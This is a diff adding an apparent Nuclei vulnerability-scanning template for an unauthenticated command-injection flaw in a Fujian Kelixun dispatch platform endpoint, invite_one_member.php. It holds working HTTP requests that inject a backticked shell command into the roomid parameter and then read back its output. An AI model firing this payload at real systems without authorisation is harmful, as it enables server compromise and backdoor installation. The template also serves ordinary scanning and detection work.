@@ -1,0 +1,41 @@
+id: klx-member-RCE
+info:
+  name: klx-member-RCE
+  author: apple
+  severity: high
+  description: 福建科立讯通信有限公司指挥调度管理平台invite_one_member.php接口处存在远程命令执行漏洞，未经身份认证的攻击者可通给该漏洞远程执行命令，写入后门文件可导致服务器失陷。
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/134377758
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+http:
+  - raw:
+      - |-
+        GET /api/client/audiobroadcast/invite_one_member.php?callee=1&roomid=`id>{{filename}}.txt` HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+      - |-
+        GET /api/client/audiobroadcast/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'roomid'
+      - type: word
+        part: body
+        words:
+          - 'uid='
